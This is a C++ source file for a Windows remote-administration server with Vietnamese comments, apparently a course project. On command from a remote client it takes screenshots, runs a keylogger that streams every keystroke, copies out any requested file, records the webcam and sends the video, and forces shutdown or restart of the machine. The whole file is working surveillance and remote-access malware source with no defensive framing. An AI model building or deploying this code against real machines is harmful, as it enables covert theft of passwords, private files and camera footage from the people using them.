#include "server_socket.h"

std::atomic<bool> stoprecording(false);
std::mutex mtx;
std::condition_variable CV;

Server::Server(int port)
    : port(port), listenSocket(INVALID_SOCKET) {
    // Initialize Winsock
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
    }

    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
}

Server::~Server() {
    // Clean up GDI+
    GdiplusShutdown(gdiplusToken);
    
    if (listenSocket != INVALID_SOCKET) {
        closesocket(listenSocket);
    }
    WSACleanup();
}

bool Server::start() {
    // Create socket
    listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        std::cerr << "Error at socket(): " << WSAGetLastError() << std::endl;
        WSACleanup();
        return false;
    }

    // Setup sockaddr_in structure
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(port);

    // Bind socket
    int result = bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    if (result == SOCKET_ERROR) {
        std::cerr << "Bind failed: " << WSAGetLastError() << std::endl;
        closesocket(listenSocket);
        return false;
    }

    // Listen for incoming connections
    result = listen(listenSocket, SOMAXCONN);
    if (result == SOCKET_ERROR) {
        std::cerr << "Listen failed: " << WSAGetLastError() << std::endl;
        closesocket(listenSocket);
        return false;
    }

    int timeout = 60000; // 60 second
    setsockopt(listenSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
    setsockopt(listenSocket, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));


    std::cout << "Server listening on port " << port << std::endl;
    return true;
}

void Server::listenForConnections() {
    while (true) {
        sockaddr_in clientAddr;
        int clientAddrSize = sizeof(clientAddr);
        SOCKET clientSocket = accept(listenSocket, (sockaddr*)&clientAddr, &clientAddrSize);
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Accept failed: " << WSAGetLastError() << std::endl;
            continue;
        }

        // Handle the connected client synchronously
        handleClient(clientSocket);

        closesocket(clientSocket);
    }
}

bool Server::captureScreenshot(cv::Mat& outImage) {

    // Khởi tạo GDI+
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    // Lấy kích thước màn hình
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Tạo DC cho màn hình và bộ nhớ
    HDC hScreenDC = GetDC(nullptr);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    // Tạo bitmap tương thích với màn hình
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

    // Sao chép màn hình vào bitmap
    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);

    // Chuyển đổi HBITMAP sang GDI+ Bitmap
    Bitmap bitmap(hBitmap, nullptr);

    // Lưu dữ liệu bitmap vào đối tượng cv::Mat
    BitmapData bitmapData;
    Rect rect(0, 0, screenWidth, screenHeight);
    if (bitmap.LockBits(&rect, ImageLockModeRead, PixelFormat24bppRGB, &bitmapData) == Ok) {
        cv::Mat temp(screenHeight, screenWidth, CV_8UC3, bitmapData.Scan0, bitmapData.Stride);
        temp.copyTo(outImage); // Sao chép dữ liệu vào ảnh đầu ra
        bitmap.UnlockBits(&bitmapData);
    } else {
        std::cerr << "Failed to lock GDI+ bitmap.\n";
        return false;
    }

    // Dọn dẹp
    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(nullptr, hScreenDC);

    // Tắt GDI+
    GdiplusShutdown(gdiplusToken);
    return true;
}

bool Server::captureAndSendScreenshot(SOCKET clientSocket) {
    cv::Mat screenshot;
    if (!captureScreenshot(screenshot)) {
        std::cerr << "Failed to capture screenshot.\n";
        return false;
    }

    std::vector<uchar> buffer;
    cv::imencode(".jpg", screenshot, buffer);  // Encode as JPG
    cv::imwrite("screenshot.jpg", screenshot);

    int dataSize = buffer.size();
    if (send(clientSocket, reinterpret_cast<const char*>(&dataSize), sizeof(dataSize), 0) == SOCKET_ERROR) {
        std::cerr << "Failed to send data size.\n";
        return false;
    }

    if (send(clientSocket, reinterpret_cast<const char*>(buffer.data()), dataSize, 0) == SOCKET_ERROR) {
        std::cerr << "Failed to send image data.\n";
        return false;
    }
    return true;
}

void Server::handleClient(SOCKET clientSocket) {
    char recvbuf[512];
    int recvbuflen = 512;

    int result;

    // Receive data from the client
    while (1)
    {
        std::cout << "Waiting for request from client..." << std::endl;
        result = recv(clientSocket, recvbuf, recvbuflen, 0);
        if (result > 0) {
            std::string receivedMessage(recvbuf, result);
            std::cout << "Received message: " << receivedMessage << std::endl;

            if (receivedMessage == "shutdown") {
                std::cout << "Shutdown command received. Server is shutting down..." << std::endl;
                closesocket(listenSocket);  // Close listening socket to stop accepting new connections
                shutdownServer();
                exit(0);  // Exit the server program
            }
            if(receivedMessage == "restart"){
                std::cout << "Restart command received. Server is restarting..." << std::endl;
                closesocket(listenSocket);  // Close listening socket to stop accepting new connections
                restartServer();
                exit(0);  // Exit the server program
            }
            if(receivedMessage == "keylogger"){
                std::cout << "Keylogger command received." << std::endl;
                keyLogger(clientSocket);
            }
            else if (receivedMessage == "screenshot")
            {
                std::cout << "Screenshot command received.\n";
                bool check = captureAndSendScreenshot(clientSocket);

                if (check) std::cout << "Screenshot saved as screenshot.jpg and sent to client!\n";
            }
            else if (receivedMessage.substr(0, 9) == "copy_file")
            {
                std::istringstream iss(receivedMessage);
                std::string command, sourceFileName, destinationFileName;

                // Parse the command
                std::getline(iss, command, '|');
                std::getline(iss, sourceFileName, '|');
                std::getline(iss, destinationFileName);

                // Call the method to copy the file and send it back
                copyFileAndSend(clientSocket, sourceFileName, destinationFileName);
            }
            else if (receivedMessage == "open_webcam")
            {
                openWebcam(clientSocket);
            }
            else if (receivedMessage == "close_connection")
            {
                std::cout << "Close connection received." << std::endl;
                std::cout << "Connection closing..." << std::endl;
                closesocket(listenSocket);
                exit(0);
                break;
            }
        } else if (result == 0) {
            std::cout << "Connection closing..." << std::endl;
            break;
        } else {
            std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
            break;
        }
    }
}

// Implementation of copyFileAndSend
void Server::copyFileAndSend(SOCKET clientSocket, const std::string& sourceFileName, const std::string& destinationFileName) {
    std::ifstream sourceFile(sourceFileName, std::ios::binary);
    if (!sourceFile) {
        std::string errorMessage = "Failed to open source file: " + sourceFileName;
        send(clientSocket, errorMessage.c_str(), static_cast<int>(errorMessage.size()), 0);
        return;
    }
    
    // Create the destination file for writing
    std::ofstream destinationFile(destinationFileName, std::ios::binary);
    if (!destinationFile) {
        std::string errorMessage = "Failed to create destination file: " + destinationFileName;
        send(clientSocket, errorMessage.c_str(), static_cast<int>(errorMessage.size()), 0);
        return;
    }

    // Copy the file content
    destinationFile << sourceFile.rdbuf();

    // Close both files
    sourceFile.close();
    destinationFile.close();

    // Send the copied file back to the client
    std::ifstream copiedFile(destinationFileName, std::ios::binary);
    if (copiedFile) {
        std::string successfulmessage = "Server sending file...";
        send(clientSocket, successfulmessage.c_str(), static_cast<int>(successfulmessage.size()), 0);

        std::this_thread::sleep_for(std::chrono::milliseconds(100));

        // Get the size of the file
        copiedFile.seekg(0, std::ios::end);
        std::streamsize size = copiedFile.tellg();
        copiedFile.seekg(0, std::ios::beg);

        // Send the size first
        uint32_t fileSize = htonl(static_cast<u_long>(size));
        send(clientSocket, reinterpret_cast<const char*>(&fileSize), sizeof(fileSize), 0);

        // Send the file data
        char buffer[1024];
        while (copiedFile.read(buffer, sizeof(buffer))) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            send(clientSocket, buffer, static_cast<int>(copiedFile.gcount()), 0);
        }
        // Send any remaining bytes
        if (copiedFile.gcount() > 0) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            send(clientSocket, buffer, static_cast<int>(copiedFile.gcount()), 0);
        }

        std::cout << "File copied and sent back to client successfully." << std::endl;
    } else {
        std::cerr << "Failed to read the copied file." << std::endl;
    }
}


//====================================================================================
void Server::shutdownServer() {


    // Execute Windows shutdown command
    int result = system("shutdown /s /t 0");

    if (result != 0) 
        std::cerr << "Failed to execute shutdown command. Error code: " << result << std::endl;
    

    // Optionally, clean up Winsock resources before shutdown
    WSACleanup();
}


void Server::restartServer(){
    // Execute Windows shutdown command
    int result = system("shutdown /r /t 0");

    if (result != 0) 
        std::cerr << "Failed to execute shutdown command. Error code: " << result << std::endl;
    

    // Optionally, clean up Winsock resources before shutdown
    WSACleanup();
}


// Check if a key is currently pressed
bool isKeyPressed(int vkCode) {
    return GetAsyncKeyState(vkCode) & 0x8000;
}

// Map numbers to their shift-modified symbols
char getShiftedSymbol(int vkCode, bool shiftPressed) {
    switch (vkCode) {
        case '1': return shiftPressed ? '!' : '1';
        case '2': return shiftPressed ? '@' : '2';
        case '3': return shiftPressed ? '#' : '3';
        case '4': return shiftPressed ? '$' : '4';
        case '5': return shiftPressed ? '%' : '5';
        case '6': return shiftPressed ? '^' : '6';
        case '7': return shiftPressed ? '&' : '7';
        case '8': return shiftPressed ? '*' : '8';
        case '9': return shiftPressed ? '(' : '9';
        case '0': return shiftPressed ? ')' : '0';

        // OEM keys and punctuation
        case VK_OEM_1: return shiftPressed ? ':' : ';';  // VK_OEM_1
        case VK_OEM_7: return shiftPressed ? '"' : '\''; // VK_OEM_7
        case VK_OEM_3: return shiftPressed ? '~': '`';
        case VK_OEM_2: return shiftPressed ? '?' : '/';  // VK_OEM_2
        case VK_OEM_4: return shiftPressed ? '{' : '[';  // VK_OEM_4
        case VK_OEM_6: return shiftPressed ? '}' : ']';  // VK_OEM_6
        case VK_OEM_5: return shiftPressed ? '|' : '\\'; // VK_OEM_5
        case VK_OEM_PERIOD: return shiftPressed ? '>' : '.';  // VK_OEM_PERIOD
        case VK_OEM_COMMA: return shiftPressed ? '<' : ',';  // VK_OEM_COMMA
        case VK_OEM_MINUS: return shiftPressed ? '_' : '-';
        case VK_OEM_PLUS: return shiftPressed ? '+' : '='; 

        default: return static_cast<char>(vkCode);  // Return the key as-is if no mapping
    }
}

void Server::readKey(int _key, SOCKET clientSocket) {
    if(_key == 160)
        return;
    char output[1024];
    output[0] = '\0';
    bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
    bool shiftPressed = isKeyPressed(VK_SHIFT);
    
    if (_key >= 'A' && _key <= 'Z') {
        bool uppercase = capsLock ^ shiftPressed;  // XOR logic: only one is true
        output[0] = uppercase ? static_cast<char>(_key) : static_cast<char>(_key + 32);
        output[1] = '\0';
    } else if ((_key >= '0' && _key <= '9') || (_key >= 186 && _key <= 222)) {
        // Use the new getShiftedSymbol function for numbers and symbols
        output[0] = getShiftedSymbol(_key, shiftPressed);
        output[1] = '\0';
    }else if (_key >= 112 && _key <= 123) {  // Function keys F1-F12
        sprintf(output, "[F%d]", _key - 111);  // Map 112-123 to F1-F12
    } else {
        // Handle other keys (e.g., space, enter, arrows)
        switch (_key) {
            case VK_SPACE: strcpy(output, "[SPACE]"); break;
            case VK_RETURN: strcpy(output, "[ENTER]"); break;
            case VK_TAB: strcpy(output, "[TAB]"); break;
            case VK_BACK: strcpy(output, "[BACKSPACE]"); break;
            case VK_ESCAPE: strcpy(output, "[ESCAPE]"); break;
            case VK_CONTROL: strcpy(output, "[CTRL]"); break;
            case VK_MENU: strcpy(output, "[ALT]"); break;
            case VK_CAPITAL: strcpy(output, "[CAPS LOCK]"); break;
            case VK_SHIFT: strcpy(output, "[SHIFT]"); break;
            case VK_LEFT: strcpy(output, "[LEFT ARROW]"); break;
            case VK_RIGHT: strcpy(output, "[RIGHT ARROW]"); break;
            case VK_UP: strcpy(output, "[UP ARROW]"); break;
            case VK_DOWN: strcpy(output, "[DOWN ARROW]"); break;
            default:
                if (_key >= 33 && _key <= 126) {
                    output[0] = static_cast<char>(_key);
                    output[1] = '\0';
                }
                break;
        }
    }
    send(clientSocket, output, static_cast<int>(strlen(output)), 0);
   
}


void Server::keyLogger(SOCKET clientSocket) {
    std::cout << "Press CTRL + ESC to exit the program.\n";
    while (true) {
        Sleep(10);  // Reduce CPU usage
        for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767) {  // Key press detected
                if (i == VK_ESCAPE) {
                    std::cout << "Exiting...\n";
                    return;  // Exit the function, which stops the program
                }       
                readKey(i, clientSocket);  // Process and print the key
            }
        }
    }
}

void Server::openWebcam(SOCKET clientSocket) {
    cv::VideoCapture webcam(0); // Open default camera (usually 0)
    
    if (!webcam.isOpened()) {
        std::string errorMessage = "Failed to open webcam.";
        send(clientSocket, errorMessage.c_str(), static_cast<int>(errorMessage.size()), 0);
        std::cerr << "Error: " << errorMessage << std::endl;
        return;
    }

    std::string successMessage = "Webcam opened successfully.";
    send(clientSocket, successMessage.c_str(), static_cast<int>(successMessage.size()), 0);
    std::cout << successMessage << std::endl;

    char recvbuf[512];
    int recvbuflen = 512;
    cv::Mat frame;
    while (true) {
        webcam >> frame; // Capture a new frame
        if (frame.empty()) break; // Check if frame is empty
        cv::imshow("Webcam Feed", frame); // Display the frame

        // Receive data from the client
        int result = recv(clientSocket, recvbuf, recvbuflen, 0);
        if (result > 0)
        {
            std::string receivedmessage(recvbuf, result);

            if (receivedmessage == "close_webcam")
            {
                std::cout << "Closing webcam..." << std::endl;
                break;
            }
            else if (receivedmessage == "start_webcam")
            {
                std::thread startRecordingThread(&Server::startRecording, this, webcam, clientSocket);
                std::cout << "Waiting for stop recording demand...";
                result = -1;
                while (result < 0)
                {
                    result = recv(clientSocket, recvbuf, recvbuflen, 0);
                }

                std::string stopmessage(recvbuf, result);
                if (stopmessage == "stop_webcam")
                {
                    {
                        std::lock_guard<std::mutex> lock(mtx);
                        stoprecording = true;
                    }
                    CV.notify_one();
                    startRecordingThread.join();
                    stopRecording(clientSocket);
                    break;
                    std::cin.ignore();
                }
            }
        }

        // You may want to send this frame to the client
        // (Add your frame sending logic here if needed)
        if (cv::waitKey(30) >= 0) break; // Break loop on key press
    }

    webcam.release(); // Release the camera
    cv::destroyAllWindows(); // Close any OpenCV windows

}

void Server::startRecording(cv::VideoCapture& webcam, SOCKET clientSocket)
{
    cv::VideoWriter videoWriter;
    videoWriter.open("Video.mp4", cv::VideoWriter::fourcc('H', '2', '6', '4'), 30, cv::Size(640, 480));
    
    if (!videoWriter.isOpened())
    {
        std::cerr << "Failed to open video writer." << std::endl;
        return;
    }

    char recvbuf[512];
    int recvbuflen = 512;
    cv::Mat frame;
    while (true)
    {
        {
            std::unique_lock<std::mutex> lock(mtx);
            if (CV.wait_for(lock, std::chrono::milliseconds(5), []{ return stoprecording.load(); })) {
                break;
            }
        }
        webcam >> frame;
        if (frame.empty()) break;
        videoWriter.write(frame);
        cv::waitKey(30);
    }
    if (videoWriter.isOpened()) videoWriter.release();
}

void Server::stopRecording(SOCKET clientSocket)
{
    std::cout << "Recording stopped." << std::endl;

    std::ifstream videoFile("Video.mp4", std::ios::binary);
    if (!videoFile)
    {
        std::string message = "Failed to open recorded video.";
        send(clientSocket, message.c_str(), static_cast<int>(message.size()), 0);
        std::cerr << "Failed to open recorded video." << std::endl;
        return;
    }
    
    std::string message = "Opened file Video.mp4.";
    send(clientSocket, message.c_str(), static_cast<int>(message.size()), 0);

    std::this_thread::sleep_for(std::chrono::milliseconds(100));

    videoFile.seekg(0, std::ios::end);
    std::streamsize fileSize = videoFile.tellg();
    videoFile.seekg(0, std::ios::beg);

    // Send the file size
    uint32_t fileSizeNetworkOrder = htonl(static_cast<uint32_t>(fileSize));
    send(clientSocket, reinterpret_cast<const char*>(&fileSizeNetworkOrder), sizeof(fileSizeNetworkOrder), 0);

    std::this_thread::sleep_for(std::chrono::milliseconds(100));

    // Send the video data
    char buffer[4096];
    while (videoFile.read(buffer, sizeof(buffer))) {
        send(clientSocket, buffer, static_cast<int>(videoFile.gcount()), 0);
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    // Send any remaining bytes
    if (videoFile.gcount() > 0) {
        send(clientSocket, buffer, static_cast<int>(videoFile.gcount()), 0);
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    videoFile.close();
}